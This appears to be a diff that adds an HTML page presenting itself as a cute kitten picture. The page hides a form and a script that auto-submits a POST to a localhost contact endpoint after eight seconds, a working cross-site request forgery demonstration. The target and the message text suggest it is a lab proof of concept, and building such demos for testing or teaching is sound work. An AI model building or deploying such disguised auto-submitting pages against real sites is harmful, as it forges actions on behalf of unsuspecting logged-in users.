@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cute Kitten Picture</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+
+    .content {
+      text-align: center;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="content">
+    <h1>Look at this adorable kitten!</h1>
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/Juvenile_Ragdoll.jpg/1200px-Juvenile_Ragdoll.jpg"
+      alt="Cute kitten">
+    <p>Isn't it the cutest thing you've ever seen?</p>
+
+    <form id="csrf-form" action="http://localhost:8000/contact" method="POST" style="display:none;">
+      <input type="text" name="name" value="Hacked User">
+      <input type="email" name="email" value="hacked@example.com">
+      <input type="text" name="message" value="This message was submitted via CSRF attack!">
+    </form>
+
+    <script>
+      setTimeout(function () {
+        document.getElementById('csrf-form').submit();
+      }, 8000);
+    </script>
+  </div>
+</body>
+
+</html>
